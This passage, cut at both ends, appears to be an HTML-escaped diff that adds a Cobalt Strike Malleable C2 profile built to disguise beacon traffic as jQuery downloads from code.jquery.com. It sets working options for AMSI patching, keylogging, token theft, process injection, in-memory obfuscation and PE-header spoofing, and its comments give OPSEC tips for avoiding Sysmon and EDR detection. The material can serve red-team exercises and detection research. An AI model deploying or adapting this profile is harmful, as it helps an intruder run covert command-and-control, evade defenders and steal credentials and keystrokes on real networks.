this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend&#x3D;w.fn.extend&#x3D;function()&#123;var e,t,n,r,i,o,a&#x3D;arguments[0]||&#123;&#125;,s&#x3D;1,u&#x3D;arguments.length,l&#x3D;!1;for(\&quot;boolean\&quot;&#x3D;&#x3D;typeof a&amp;&amp;(l&#x3D;a,a&#x3D;arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;&#x3D;&#x3D;typeof a||g(a)||(a&#x3D;&#123;&#125;),s&#x3D;&#x3D;&#x3D;u&amp;&amp;(a&#x3D;this,s--);s&lt;u;s++)if(null!&#x3D;(e&#x3D;arguments[s]))for(t in e)n&#x3D;a[t],a!&#x3D;&#x3D;(r&#x3D;e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i&#x3D;Array.isArray(r)))?(i?(i&#x3D;!1,o&#x3D;n&amp;&amp;Array.isArray(n)?n:[]):o&#x3D;n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]&#x3D;w.extend(l,o,r)):void 0!&#x3D;&#x3D;r&amp;&amp;(a[t]&#x3D;r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(&#x2F;\\D&#x2F;g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!&#x3D;&#x3D;c.call(e))&amp;&amp;(!(t&#x3D;i(e))||\&quot;function\&quot;&#x3D;&#x3D;typeof(n&#x3D;f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)&#x3D;&#x3D;&#x3D;d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r&#x3D;0;if(C(e))&#123;for(n&#x3D;e.length;r&lt;n;r++)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null&#x3D;&#x3D;e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n&#x3D;t||[];return null!&#x3D;e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;&#x3D;&#x3D;typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null&#x3D;&#x3D;t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n&#x3D;+t.length,r&#x3D;0,i&#x3D;e.length;r&lt;n;r++)e[i++]&#x3D;t[r];return e.length&#x3D;i,e&#125;,grep:function(e,t,n)&#123;for(var r,i&#x3D;[],o&#x3D;0,a&#x3D;e.length,s&#x3D;!n;o&lt;a;o++)(r&#x3D;!t(e[o],o))!&#x3D;&#x3D;s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o&#x3D;0,s&#x3D;[];if(C(e))for(r&#x3D;e.length;o&lt;r;o++)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;&#x3D;&#x3D;typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]&#x3D;n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]&#x3D;t.toLowerCase()&#125;);function C(e)&#123;var t&#x3D;!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n&#x3D;x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;&#x3D;&#x3D;&#x3D;n||0&#x3D;&#x3D;&#x3D;t||\&quot;number\&quot;&#x3D;&#x3D;typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E&#x3D;function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b&#x3D;\&quot;sizzle\&quot;+1*new Date,w&#x3D;e.document,T&#x3D;0,C&#x3D;0,E&#x3D;ae(),k&#x3D;ae(),S&#x3D;ae(),D&#x3D;function(e,t)&#123;return e&#x3D;&#x3D;&#x3D;t&amp;&amp;(f&#x3D;!0),0&#125;,N&#x3D;&#123;&#125;.hasOwnProperty,A&#x3D;[],j&#x3D;A.pop,q&#x3D;A.push,L&#x3D;A.push,H&#x3D;A.slice,O&#x3D;function(e,t)&#123;for(var n&#x3D;0,r&#x3D;e.length;n&lt;r;n++)if(e[n]&#x3D;&#x3D;&#x3D;t)return n;return-1&#125;,P&#x3D;\&quot;\r&quot;;
+            # 1st Line
+            prepend &quot;&#x2F;*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org&#x2F;license *&#x2F;&quot;;
+            append &quot;\&quot;.(o&#x3D;t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0&#x3D;&#x3D;&#x3D;i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]&#x3D;function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1&#x3D;&#x3D;&#x3D;arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy&#x3D;function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;&#x3D;&#x3D;typeof t&amp;&amp;(n&#x3D;e[t],t&#x3D;e,e&#x3D;n),g(e))return r&#x3D;o.call(arguments,2),i&#x3D;function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid&#x3D;e.guid&#x3D;e.guid||w.guid++,i&#125;,w.holdReady&#x3D;function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray&#x3D;Array.isArray,w.parseJSON&#x3D;JSON.parse,w.nodeName&#x3D;N,w.isFunction&#x3D;g,w.isWindow&#x3D;y,w.camelCase&#x3D;G,w.type&#x3D;x,w.now&#x3D;Date.now,w.isNumeric&#x3D;function(e)&#123;var t&#x3D;w.type(e);return(\&quot;number\&quot;&#x3D;&#x3D;&#x3D;t||\&quot;string\&quot;&#x3D;&#x3D;&#x3D;t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;&#x3D;&#x3D;typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt&#x3D;e.jQuery,Kt&#x3D;e.$;return w.noConflict&#x3D;function(t)&#123;return e.$&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.$&#x3D;Kt),t&amp;&amp;e.jQuery&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.jQuery&#x3D;Jt),w&#125;,t||(e.jQuery&#x3D;e.$&#x3D;w),w&#125;);&quot;;
+            print;
+        &#125;
+    &#125;
+
+    client &#123;
+        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&quot;;
+        header &quot;Accept-Language&quot; &quot;en-US,en;q&#x3D;0.5&quot;;
+        #header &quot;Host&quot; &quot;code.jquery.com&quot;;
+        header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;code.jquery.com&#x2F;&quot;;
+        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
+    &#125;
+&#125;
+
+################################################
+## Post Exploitation
+################################################
+## Description:
+##    Controls post-exploitation jobs, including default x86&#x2F;x64 program to open and inject shellcode into, AMSI bypass for execute-assembly, powerpick, and psinject
+##    https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-malleable-postex
+## Values:
+##    spawnto_x86       %windir%\\syswow64\\rundll32.exe
+##    spawnto_x64       %windir%\\sysnative\\rundll32.exe
+##    obfuscate         false                                   CS 3.14 - Scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way
+##    pipename          postex_####, windows\\pipe_##           CS 4.2 - Change the named pipe names used, by post-ex DLLs, to send output back to Beacon. This option accepts a comma-separated list of pipenames. Cobalt Strike will select a random pipe name from this option when it sets up a post-exploitation job. Each # in the pipename is replaced with a valid hex character as well.
+##    smartinject       false                                   CS 3.14 added to postex block - Directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs.
+##    amsi_disable      false                                   CS 3.13 - Directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
+##    keylogger         GetAsyncKeyState                        CS 4.2 - The GetAsyncKeyState option (default) uses the GetAsyncKeyState API to observe keystrokes. The SetWindowsHookEx option uses SetWindowsHookEx to observe keystrokes.
+##    threadhint                                                CS 4.2 - allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address. Specify the thread hint as &quot;module!function+0x##&quot; to specify the start address to spoof. The optional 0x## part is an offset added to the start address.
+##    cleanup           false                                   CS 4.9 - Cleans up the post-ex UDRL memory when the post-ex DLL is loaded.
+
+## Guidelines
+##    - spawnto can only be 63 chars
+##    - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings
+##      - sysnative for x64 and syswow64 for x86
+##      - Example x64 : C:\\Windows\\sysnative\\w32tm.exe
+##        Example x86 : C:\\Windows\\syswow64\\w32tm.exe
+##    - The binary doesnt do anything wierd (protected binary, etc)
+##    - !! Don&#39;t use these !! 
+##    -   &quot;csrss.exe&quot;,&quot;logoff.exe&quot;,&quot;rdpinit.exe&quot;,&quot;bootim.exe&quot;,&quot;smss.exe&quot;,&quot;userinit.exe&quot;,&quot;sppsvc.exe&quot;
+##    - A binary that executes without the UAC
+##    - 64 bit for x64
+##    - 32 bit for x86
+##    - You can add command line parameters to blend
+##      - set spawnto_x86 &quot;%windir%\\syswow64\\svchost.exe -k netsvcs&quot;;
+##      - set spawnto_x64 &quot;%windir%\\sysnative\\svchost.exe -k netsvcs&quot;;
+##      - Note: svchost.exe may look weird as the parent process 
+##    - The obfuscate option scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way. It’s very similar to the obfuscate and userwx options available for Beacon via the stage block.
+##    - The amsi_disable option directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
+##    - The smartinject option directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs. This allows post-ex DLLs to bootstrap themselves in a new process without shellcode-like behavior that is detected and mitigated by watching memory accesses to the PEB and kernel32.dll
+post-ex &#123;
+    # Optionally specify non-existent filepath to force manual specification based on the Beacon host&#39;s running processes
+    set spawnto_x86 &quot;%windir%\\syswow64\\dllhost.exe&quot;;
+    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.
+    set spawnto_x64 &quot;%windir%\\sysnative\\dllhost.exe&quot;;
+    # change the permissions and content of our post-ex DLLs
+    set obfuscate &quot;true&quot;;
+    # pass key function pointers from Beacon to its child jobs
+    set smartinject &quot;true&quot;;
+    # disable AMSI in powerpick, execute-assembly, and psinject
+    set amsi_disable &quot;true&quot;;
+    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
+    set cleanup &quot;true&quot;;
+    # Modify our post-ex pipe names
+    set pipename &quot;Winsock2\\CatalogChangeListener-###-0,&quot;;
+    set keylogger &quot;GetAsyncKeyState&quot;;
+    #set threadhint &quot;module!function+0x##&quot;
+&#125;
+
+################################################
+## Steal Token Access Mask
+################################################
+## Description:
+##    Added in CS4.7
+##    Allows you to set a default OpenProcessToken access mask used for steal_token and bsteal_token
+## Defaults:
+##    steal_token_access_mask &quot;0&quot;;         # TOKEN_ALL_ACCESS
+## Guidelines
+##    - Suggested values: 0 &#x3D; TOKEN_ALL_ACCESS or 11 &#x3D; TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8)
+##    - Can be helpful for stealing tokens from processes using &#39;SYSTEM&#39; user and you have this error: Could not open process token: &#123;pid&#125; (5)
+##    - Refer to
+##       https:&#x2F;&#x2F;hstechdocs.helpsystems.com&#x2F;manuals&#x2F;cobaltstrike&#x2F;current&#x2F;userguide&#x2F;content&#x2F;topics&#x2F;post-exploitation_trust-relationships.htm
+##
+set steal_token_access_mask &quot;0&quot;; # TOKEN_ALL_ACCESS
+
+################################################
+## Memory Indicators
+################################################
+## Description:
+##    The stage block in Malleable C2 profiles controls how Beacon is loaded into memory and edit the content of the Beacon Reflective DLL.
+## Values:
+##    allocator         VirtualAlloc            CS 4.2 - Set how Beacon&#39;s Reflective Loader allocates memory for the agent. Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
+##    checksum          0                       The CheckSum value in Beacon&#39;s PE header
+##    cleanup           false                   Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
+##    compile_time      14 July 2009 8:14:00    The build time in Beacon&#39;s PE header
+##    entry_point       92145                   The EntryPoint value in Beacon&#39;s PE header
+##    image_size_x64    512000                  SizeOfImage value in x64 Beacon&#39;s PE header
+##    image_size_x86    512000                  SizeOfImage value in x86 Beacon&#39;s PE header
+##    magic_mz_x86      MZRE                    CS 4.2 - Override the first bytes (MZ header included) of Beacon&#39;s Reflective DLL. Valid x86 instructions are required. Follow instructions that change CPU state with instructions that undo the change.
+##    magic_mz_x64      MZAR                    CS 4.2 - Same as magic_mz_x86; affects x64 DLL.
+##    module_x64        xpsservices.dll         Same as module_x86; affects x64 loader
+##    module_x86        xpsservices.dll         Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
+##    magic_pe          PE                      Override the PE character marker used by Beacon&#39;s Reflective Loader with another value.
+##    name	            beacon.x64.dll          The Exported name of the Beacon DLL
+##    obfuscate         false                   Obfuscate the Reflective DLL&#39;s import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers. As of 4.2 CS now obfuscates .text section in rDLL package
+##    rich_header       N&#x2F;A                     Meta-information inserted by the compiler
+##    sleep_mask        false                   CS 3.12 - Obfuscate Beacon (HTTP, SMB, TCP Beacons), in-memory, prior to sleeping (HTTP) or waiting for a new connection\data (SMB\TCP)
+##    smartinject       false                   CS 4.1 added to stage block - Use embedded function pointer hints to bootstrap Beacon agent without walking kernel32 EAT
+##    stomppe           true                    Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
+##    userwx            false                   Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
+## Guidelines:
+##    - Modify the indicators to minimize in memory indicators
+##    - Refer to 
+##       https:&#x2F;&#x2F;blog.cobaltstrike.com&#x2F;2018&#x2F;02&#x2F;08&#x2F;in-memory-evasion&#x2F;
+##       https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list&#x3D;PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK
+##       https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;AV4XjxYe4GM (Obfuscate and Sleep)
+stage &#123;
+    
+    # CS 4.2 added allocator and MZ header overrides
+    set allocator      &quot;VirtualAlloc&quot;; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
+    #set magic_mz_x86   &quot;MZRE&quot;;
+    #set magic_mz_x64   &quot;MZAR&quot;;
+    set magic_pe       &quot;NO&quot;;
+    set userwx         &quot;false&quot;; 
+    set stomppe        &quot;true&quot;;
+    set obfuscate      &quot;true&quot;;
+    set cleanup        &quot;true&quot;;
+    # CS 3.12 Addition &quot;Obfuscate and Sleep&quot;
+    set sleep_mask     &quot;true&quot;;
+    # CS 4.1  
+    set smartinject    &quot;true&quot;;
+
+    # Make the Beacon Reflective DLL look like something else in memory
+    # Values captured using peclone agaist a Windows 10 version of explorer.exe
+    set checksum       &quot;0&quot;;
+    set compile_time   &quot;11 Nov 2016 04:08:32&quot;;
+    set entry_point    &quot;650688&quot;;
+    set image_size_x86 &quot;4661248&quot;;
+    set image_size_x64 &quot;4661248&quot;;
+    set name           &quot;srv.dll&quot;;
+    set rich_header    &quot;\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;
+
+    ## WARNING: Module stomping 
+    # Cobalt Strike 3.11 also adds module stomping to Beacon&#39;s Reflective Loader. When enabled, Beacon&#39;s loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
+    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
+    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon&#39;s process. If the current process loads the same library later (for whatever reason), you will crash Beacon&#39;s process. Choose carefully.
+    # By default, Beacon&#39;s loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon&#39;s x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It&#39;s important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
+    # Details can be found in the In-memory Evasion video series. https:&#x2F;&#x2F;youtu.be&#x2F;uWVH9l2GMw4
+
+    # set module_x64 &quot;netshell.dll&quot;;
+    # set module_x86 &quot;netshell.dll&quot;;
+
+    # CS 4.8 - Added default syscall method option. This option supports: None, Direct, and Indirect.
+    set syscall_method &quot;None&quot;;
+    
+    # The transform-x86 and transform-x64 blocks pad and transform Beacon&#39;s Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
+    transform-x86 &#123; # transform the x86 rDLL stage
+        prepend &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;; # prepend nops
+        strrep &quot;ReflectiveLoader&quot; &quot;execute&quot;; # Change this text
+        strrep &quot;This program cannot be run in DOS mode&quot; &quot;&quot;; # Remove this text
+        strrep &quot;beacon.dll&quot; &quot;&quot;; # Remove this text
+    &#125;
+    transform-x64 &#123; # transform the x64 rDLL stage
+        prepend &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;; # prepend nops
+        strrep &quot;ReflectiveLoader&quot; &quot;execute&quot;; # Change this text in the Beacon DLL
+        strrep &quot;beacon.x64.dll&quot; &quot;&quot;; # Remove this text in the Beacon DLL
+    &#125;
+
+    stringw &quot;jQuery&quot;; # Add this string to the DLL
+&#125;
+
+################################################
+## Process Injection
+################################################
+## Description:
+##    The process-inject block in Malleable C2 profiles shapes injected content and controls process injection behavior.
+## Values:
+##    allocator         VirtualAllocEx      The preferred method to allocate memory in the remote process. Specify VirtualAllocEx or NtMapViewOfSection. The NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx is always used for cross-arch memory allocations.
+##    bof_allocator     VirtualAlloc        CS 4.7 - The preferred method to allocate memory in the current process to execute a BOF. Specify VirtualAlloc, MapViewOfFile, or HeapAlloc.
+##    bof_reuse_memory  true                CS 4.7 - Determines whether or not memory is released. If this setting is “true”, memory is cleared and then reused for the next BOF execution; if this setting is “false”, memory is released and the appropriate memory free function is used, based on the bof_allocator setting.
+##    min_alloc         4096                Minimum amount of memory to request for injected content.
+##    startrwx          false               Use RWX as initial permissions for injected content. Alternative is RW.
+##    userwx            false               Use RWX as final permissions for injected content. Alternative is RX.
+## 
+## 
+## Use the transform-x86\x64 to pad content injected by Beacon
+## Use the execute block to control use of Beacon&#39;s process injection techniques
+## Guidelines:
+##    - Modify the indicators to minimize in memory indicators
+#     - Refer to 
+##       https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-malleable-c2#processinject
+##       https:&#x2F;&#x2F;blog.cobaltstrike.com&#x2F;2019&#x2F;08&#x2F;21&#x2F;cobalt-strikes-process-injection-the-details&#x2F;
+process-inject &#123;
+
+    # set a remote memory allocation technique: VirtualAllocEx|NtMapViewOfSection
+    set allocator &quot;NtMapViewOfSection&quot;;
+
+    # CS 4.7 added memory allocation methods for BOF content in the current process
+    set bof_allocator &quot;VirtualAlloc&quot;; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
+    set bof_reuse_memory &quot;true&quot;;
+
+    # Minimium memory allocation size when injecting content
+    set min_alloc &quot;17500&quot;;
+    
+    # Set memory permissions as permissions as initial&#x3D;RWX, final&#x3D;RX
+    set startrwx &quot;false&quot;;
+    set userwx   &quot;false&quot;;
+
+    # Transform injected content to avoid signature detection of first few bytes. Only supports prepend and append.
+    transform-x86 &#123;
+        prepend &quot;\x90\x90&quot;;
+        #append &quot;\x90\x90&quot;;
+    &#125;
+
+    transform-x64 &#123;
+        prepend &quot;\x90\x90&quot;;
+        #append &quot;\x90\x90&quot;;
+    &#125;
+  
+    ## The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. The execute options include:
+    #
+    # Name                      x86-&gt;x64    x64-x86     Notes
+    #########################################################################
+    # CreateThread                                      Current Process only
+    # CreateRemoteThread                       Yes      No cross-session
+    # NtQueueApcThread                                  
+    # NtQueAPCThread-s                                  This is the &quot;Early Bird&quot; injection technique. Suspended processes (e.g., post-ex jobs) only.
+    # RtlCreateUserThread           Yes        Yes      Risky on XP-era targets; uses RWX shellcode for x86-&gt;x64 injection.
+    # SetThreadContext                         Yes      Suspended processes (e.g. post-ex jobs only)
+    execute &#123;
+
+        # The order is important! Each step will be attempted (if applicable) until successful
+        ## self-injection
+        CreateThread &quot;ntdll!RtlUserThreadStart+0x42&quot;;
+        CreateThread;
+
+        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
+        # OPSEC - when you use SetThreadContext; your thread will have a start address that reflects the original execution entry point of the temporary process.
+        # SetThreadContext;
+        NtQueueApcThread-s;
+        
+        ## Injection into existing processes
+        # OPSEC Uses RWX stub - Detected by Get-InjectedThread. Less detected by some defensive products.
+        #NtQueueApcThread; 
+        
+        # CreateRemotThread - Vanilla cross process injection technique. Doesn&#39;t cross session boundaries
+        # OPSEC - fires Sysmon Event 8
+        CreateRemoteThread;
+        
+        # RtlCreateUserThread - Supports all architecture dependent corner cases (e.g., 32bit -&gt; 64bit injection) AND injection across session boundaries
+        # OPSEC - fires Sysmon Event 8. Uses Meterpreter implementation and RWX stub - Detected by Get-InjectedThread
+        RtlCreateUserThread; 
+    &#125;
+&#125;
+
+################################################
+## Maleable C2 
+## https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;help-malleable-c2#options
+################################################
+## HTTP Headers
+################################################
+## Description:
+##    The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. Here, you may specify additional HTTP headers and the HTTP header order.
+## Values:
+##    set headers                   &quot;Comma separated list of headers&quot;    The set headers option specifies the order these HTTP headers are delivered in an HTTP response. Any headers not in this list are added to the end.
+##    header                        &quot;headername&quot; &quot;header alue            The header keyword adds a header value to each of Cobalt Strike&#39;s HTTP responses. If the header value is already defined in a response, this value is ignored.
+##    set trust_x_forwarded_for     &quot;true&quot;                               Adds this header to determine remote address of a request.
+##    block_useragents              &quot;curl*,lynx*,wget*&quot;                  Default useragents that are blocked
+## Guidelines:
+##    - Use this section in addition to the &quot;server&quot; secion in http-get and http-post to further define the HTTP headers 
+http-config &#123;
+    set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;;
+    header &quot;Server&quot; &quot;Apache&quot;;
+    header &quot;Keep-Alive&quot; &quot;timeout&#x3D;10, max&#x3D;100&quot;;
+    header &quot;Connection&quot; &quot;Keep-Alive&quot;;
+    # Use this option if your teamserver is behind a redirector
+    set trust_x_forwarded_for &quot;true&quot;;
+    # Block Specific User Agents with a 404 (added in 4.3)
+    set block_useragents &quot;curl*,lynx*,wget*&quot;;
+&#125;
+
+################################################
+## HTTP GET
+################################################
+## Description:
+##    GET is used to poll teamserver for tasks
+## Defaults:
+##    uri &quot;&#x2F;activity&quot;
+##    Headers (Sample)
+##      Accept: *&#x2F;*
+##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31&#x2F;5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3&#x2F;aK0MnXoM&#x3D;
+##      User-Agent Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident&#x2F;4.0; SV1)
+## Guidelines:
+##    - Add customize HTTP headers to the HTTP traffic of your campaign
+##    - Analyze sample HTTP traffic to use as a reference
+##    - Multiple URIs can be added. Beacon will randomly pick from these.
+##      - Use spaces as a URI seperator
+http-get &#123;
+
+    set uri &quot;&#x2F;api&#x2F;get&quot;;
+    set verb &quot;GET&quot;;
+
+    client &#123;
+
+        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;
+        #header &quot;Host&quot; &quot;code.jquery.com&quot;;
+        header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;code.jquery.com&#x2F;&quot;;
+        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
+
+        metadata &#123;
+            base64;
+            prepend &quot;SESSIONID&#x3D;&quot;;
+            header &quot;Cookie&quot;;
+        &#125;
+    &#125;
+
+    server &#123;
+
+        header &quot;Server&quot; &quot;Nodejs&quot;;
+        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;
+        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;
+
+        output &#123;
+            base64;
+            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+            # 2nd Line            
+            #prepend &quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;&#x3D;&#x3D;typeof module&amp;&amp;\&quot;object\&quot;&#x3D;&#x3D;typeof module.exports?module.exports&#x3D;e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!&#x3D;typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n&#x3D;[],r&#x3D;e.document,i&#x3D;Object.getPrototypeOf,o&#x3D;n.slice,a&#x3D;n.concat,s&#x3D;n.push,u&#x3D;n.indexOf,l&#x3D;&#123;&#125;,c&#x3D;l.toString,f&#x3D;l.hasOwnProperty,p&#x3D;f.toString,d&#x3D;p.call(Object),h&#x3D;&#123;&#125;,g&#x3D;function e(t)&#123;return\&quot;function\&quot;&#x3D;&#x3D;typeof t&amp;&amp;\&quot;number\&quot;!&#x3D;typeof t.nodeType&#125;,y&#x3D;function e(t)&#123;return null!&#x3D;t&amp;&amp;t&#x3D;&#x3D;&#x3D;t.window&#125;,v&#x3D;&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o&#x3D;(t&#x3D;t||r).createElement(\&quot;script\&quot;);if(o.text&#x3D;e,n)for(i in v)n[i]&amp;&amp;(o[i]&#x3D;n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null&#x3D;&#x3D;e?e+\&quot;\&quot;:\&quot;object\&quot;&#x3D;&#x3D;typeof e||\&quot;function\&quot;&#x3D;&#x3D;typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b&#x3D;\&quot;3.3.1\&quot;,w&#x3D;function(e,t)&#123;return new w.fn.init(e,t)&#125;,T&#x3D;&#x2F;^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$&#x2F;g;w.fn&#x3D;w.prototype&#x3D;&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null&#x3D;&#x3D;e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t&#x3D;w.merge(this.constructor(),e);return 